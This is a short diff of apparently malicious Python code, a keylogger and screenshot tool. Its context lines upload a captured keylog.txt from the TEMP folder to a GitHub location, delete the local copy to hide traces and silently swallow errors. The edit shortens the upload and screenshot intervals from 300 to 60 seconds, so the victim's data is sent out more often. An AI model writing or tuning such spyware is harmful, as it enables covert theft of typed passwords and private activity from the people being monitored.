@@ -333,7 +333,7 @@ def main():
             # Upload keylog to GitHub
             keylog_path = os.path.join(os.getenv('TEMP'), "keylog.txt")
             upload_to_github(keylog_path, "keylog.txt", log_folder_url)
-            time.sleep(300)
+            time.sleep(60)
 
             # After successful upload, delete the local keylog.txt file
             if os.path.exists(keylog_path):
@@ -344,7 +344,7 @@ def main():
             cleanup_old_files(log_folder_url, ignore_file='placeholder.txt')
 
             # Wait for 60 seconds before taking the next screenshot
-            time.sleep(300)
+            time.sleep(60)
 
     except Exception as e:
         pass
